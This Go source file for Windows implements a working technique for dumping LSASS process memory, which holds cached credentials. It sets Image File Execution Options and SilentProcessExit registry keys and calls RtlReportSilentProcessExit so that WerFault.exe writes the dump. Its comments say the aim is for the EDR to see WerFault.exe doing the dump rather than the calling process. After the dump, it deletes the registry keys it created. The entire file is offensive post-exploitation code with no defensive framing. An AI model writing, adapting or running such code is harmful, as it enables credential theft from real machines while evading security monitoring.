//go:build windows

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// lsassDumpViaWER triggers a WER (Windows Error Reporting) dump of LSASS using
// RtlReportSilentProcessExit — a technique that does not require opening a
// handle directly to lsass.exe with PROCESS_VM_READ.
//
// How it works:
//   1. Write a registry key under IFEO\lsass.exe pointing to our dump output dir
//      and enabling SilentProcessExit monitoring.
//   2. Call RtlReportSilentProcessExit(hLsass, status) which asks the WER service
//      to create a dump.  WER calls MiniDumpWriteDump on our behalf — the EDR sees
//      WerFault.exe doing the dump, not our process.
//   3. Wait for the .dmp file to appear in the configured directory, then copy it
//      to outPath.
//   4. Clean up the registry keys.
//
// Requires SeDebugPrivilege; the dump is written by werfault.exe to
// %LOCALAPPDATA%\CrashDumps\ (or a custom dir) at Windows' request.
func lsassDumpViaWER(outPath string) (string, error) {
	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		return "", fmt.Errorf("enable SeDebugPrivilege: %w", err)
	}

	// Use a temp directory under LocalAppData for WER's output.
	dumpDir := filepath.Join(os.TempDir(), "wer_lsass")
	if err := os.MkdirAll(dumpDir, 0700); err != nil {
		return "", fmt.Errorf("create dump dir: %w", err)
	}
	defer os.RemoveAll(dumpDir)

	// Configure IFEO silent exit for lsass.exe.
	if err := werSetIFEO("lsass.exe", dumpDir); err != nil {
		return "", fmt.Errorf("set IFEO: %w", err)
	}
	defer werClearIFEO("lsass.exe")

	lsassPID, err := pidByName("lsass.exe")
	if err != nil {
		return "", fmt.Errorf("find lsass.exe: %w", err)
	}

	// Open lsass with minimal rights — just PROCESS_QUERY_INFORMATION.
	hLsass, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, lsassPID)
	if err != nil {
		return "", fmt.Errorf("OpenProcess(lsass, QUERY_INFO): %w", err)
	}
	defer windows.CloseHandle(hLsass)

	// Trigger the WER dump.
	r, _, e := procRtlReportSilentProcessExit.Call(uintptr(hLsass), 0)
	if r != 0 {
		return "", fmt.Errorf("RtlReportSilentProcessExit: NTSTATUS 0x%08X (%v)", uint32(r), e)
	}

	// Wait up to 30 s for WER to write the dump.
	dmpPath, err := waitForDump(dumpDir, "lsass", 30*time.Second)
	if err != nil {
		return "", fmt.Errorf("waiting for WER dump: %w", err)
	}

	// Move/copy dump to the requested output path.
	if err := copyFile(dmpPath, outPath); err != nil {
		return "", fmt.Errorf("copy dump: %w", err)
	}
	stat, _ := os.Stat(outPath)
	return fmt.Sprintf("LSASS WER dump → %s (%d bytes)", outPath, stat.Size()), nil
}

// ─── IFEO registry helpers ────────────────────────────────────────────────────

const (
	ifeoBase = `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
	speBase  = `SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit`
)

func werSetIFEO(procName, dumpDir string) error {
	// IFEO\<proc>: GlobalFlag = 0x200 (FLG_MONITOR_SILENT_PROCESS_EXIT)
	ifeoPath := ifeoBase + `\` + procName
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, ifeoPath,
		registry.SET_VALUE|registry.WOW64_64KEY)
	if err != nil {
		return fmt.Errorf("CreateKey IFEO\\%s: %w", procName, err)
	}
	k.SetDWordValue("GlobalFlag", 0x200)
	k.Close()

	// SilentProcessExit\<proc>: ReportingMode=1, DumpType=2, DumpFolder
	spePath := speBase + `\` + procName
	k2, _, err := registry.CreateKey(registry.LOCAL_MACHINE, spePath,
		registry.SET_VALUE|registry.WOW64_64KEY)
	if err != nil {
		return fmt.Errorf("CreateKey SilentProcessExit\\%s: %w", procName, err)
	}
	defer k2.Close()
	k2.SetDWordValue("ReportingMode", 1)
	k2.SetDWordValue("DumpType", 2)
	return k2.SetStringValue("DumpFolder", dumpDir)
}

func werClearIFEO(procName string) {
	registry.DeleteKey(registry.LOCAL_MACHINE, ifeoBase+`\`+procName)  //nolint:errcheck
	registry.DeleteKey(registry.LOCAL_MACHINE, speBase+`\`+procName)   //nolint:errcheck
	_ = windows.GetCurrentProcessId // keep windows import used
}

// ─── Dump wait helper ─────────────────────────────────────────────────────────

// waitForDump polls dumpDir until a .dmp file matching namePrefix appears,
// or until timeout is exceeded.
func waitForDump(dumpDir, namePrefix string, timeout time.Duration) (string, error) {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		entries, err := os.ReadDir(dumpDir)
		if err != nil {
			time.Sleep(500 * time.Millisecond)
			continue
		}
		for _, e := range entries {
			if !e.IsDir() && strings.HasPrefix(strings.ToLower(e.Name()), strings.ToLower(namePrefix)) &&
				strings.HasSuffix(strings.ToLower(e.Name()), ".dmp") {
				return filepath.Join(dumpDir, e.Name()), nil
			}
		}
		time.Sleep(500 * time.Millisecond)
	}
	return "", fmt.Errorf("no dump file found in %s after %v", dumpDir, timeout)
}

// ─── File copy ────────────────────────────────────────────────────────────────

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	buf := make([]byte, 1<<20)
	for {
		n, readErr := in.Read(buf)
		if n > 0 {
			if _, wErr := out.Write(buf[:n]); wErr != nil {
				return wErr
			}
		}
		if readErr != nil {
			break
		}
	}
	return nil
}
